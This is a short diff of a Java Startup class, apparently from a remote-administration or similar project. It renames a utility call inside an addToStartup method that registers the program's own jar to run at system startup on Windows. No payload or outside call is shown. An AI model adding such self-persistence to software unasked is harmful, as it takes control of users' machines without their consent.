@@ -5,11 +5,12 @@ import java.io.FileWriter;
 import java.io.PrintWriter;
 
 import com.redpois0n.common.os.OperatingSystem;
+import com.redpois0n.utils.Utils;
 
 public class Startup {
 
 	public static final void addToStartup(String name) throws Exception {
-		File currentJar = Util.getJarFile();
+		File currentJar = Utils.getJarFile();
 		
 		if (currentJar.isFile()) {
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
